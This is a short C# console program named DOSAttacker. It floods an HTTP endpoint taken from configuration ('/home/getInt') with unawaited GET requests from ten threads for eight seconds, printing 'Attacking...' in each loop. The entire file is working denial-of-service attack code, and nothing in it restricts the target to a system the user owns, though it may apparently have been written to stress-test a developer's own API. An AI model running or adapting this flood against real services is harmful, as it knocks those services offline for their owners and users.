using System;
using System.Collections.Generic;
using System.Configuration;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;

namespace DOSAttacker {
    class Program {
        static HttpClient client = new HttpClient();
        public static int secondsOfAttack;
        public static string path;
        static void Main(string[] args) {
            Program program = new Program();
            string url = ConfigurationManager.AppSettings["APIURL"];
            path = url + "/home/getInt";
            secondsOfAttack = 8;
            program.initAttack(10);
            Console.WriteLine("Attack and cleanup complete press any key to close");
            Console.ReadKey();
        }

        public void initAttack(int numberOfThreads) {
            Console.WriteLine("Initializing attack...");
            List<Thread> threads = new List<Thread>();
            for (int i = 0; i < numberOfThreads; i++) {
                ThreadStart start = new ThreadStart(Attack);
                threads.Add(new Thread(start));
                Console.WriteLine($"Thread {i} created");
                Console.WriteLine($"Thread {i} Started");
            }
            Console.WriteLine("threads created press any key to begin attack");
            Console.ReadKey();
            foreach (var thread in threads) {
                thread.Start();
            }
            Thread.Sleep(secondsOfAttack*1000);
            foreach (var thread in threads) {
                thread.Abort();
                Console.WriteLine("Thread Aborted");
            }
            
          
        }

        public async void Attack() {
            var endTime = DateTime.Now.AddSeconds(secondsOfAttack);
            while (DateTime.Compare(DateTime.Now, endTime) < 0) {
                client.GetAsync(path);
                Console.WriteLine("Attacking...");
            }
        }
    }
}
